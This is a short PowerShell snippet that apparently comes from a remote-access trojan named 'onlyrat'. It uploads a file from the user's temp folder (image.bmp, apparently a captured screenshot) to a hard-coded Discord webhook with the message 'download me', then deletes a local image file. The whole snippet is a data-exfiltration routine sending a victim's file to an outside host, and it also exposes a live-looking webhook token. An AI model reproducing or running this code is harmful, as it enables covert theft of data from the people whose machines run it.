$link = "https://discord.com/api/webhooks/1182206285043728434/wNxaBaI78nxyhnhFcDgM1sSNnaYV0S0ECCjHGTHPCl4PMrbVUyiVoqlYfUNSTij5Bxrc"
Invoke-Expression "curl.exe -F `"payload_json={\```"username\```": \```"onlyrat\```", \```"content\```": \```"download me\```"}`" -F ```"file=@$env:temp\happy\image.bmp```" $link"

Remove-Item image.img